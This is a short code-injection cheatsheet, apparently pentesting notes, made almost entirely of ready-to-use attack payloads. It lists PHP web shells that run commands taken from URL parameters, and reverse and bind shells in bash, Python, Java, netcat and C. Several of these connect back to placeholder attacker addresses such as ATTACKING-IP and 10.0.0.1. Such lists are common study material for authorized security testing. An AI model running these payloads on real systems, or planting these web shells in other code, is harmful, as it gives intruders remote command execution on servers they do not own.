# Code Injection Cheatsheet
## php: 

### Execute one command
```php
<?php system("whoami"); ?>
<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
```
### Take input from the url paramter. shell.php?cmd=whoami
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET["cmd"]); ?>
<? passthru($_GET["cmd"]); ?>
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php $c=$_GET[‘c’]; echo `$c`; ?>
```
### The same but using passthru
```php
<?php passthru($_GET['cmd']); ?>
```
### For shell_exec to output the result you need to echo it
```php
<?php echo shell_exec("whoami");?>
```
### preg_replace(). This is a cool trick
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
### Using backticks
```php
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
```
### Using backticks
```php
<?php echo `whoami`; ?>
```
### upload nc.php
```php
<?php echo system("nc -lvp 81 -e cmd.exe");?>
```
- upload nc.exe
- run nc.php on browser

## Bash
```sh
0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -i >& /dev/tcp/<your ip>/<your port> 0>&1
nc -nlvp 443
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <your port> >/tmp/f
```

## Python
```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

## Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Netcat
### netcat bind shell
```sh
nc -vlp 5555 -e /bin/bash
nc 192.168.1.101 5555
```
### netcat reverse shell
```sh
nc -lvp 5555
nc 192.168.1.101 5555 -e /bin/bash
```
### With -e flag
```sh
nc -e /bin/sh <your ip> <your port>
```
### Without -e flag
```sh
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
## C
```c
#include <stdlib.h>
int main () {
system("nc.exe -e cmd.exe <myip> <myport>");
return 0;
}
```
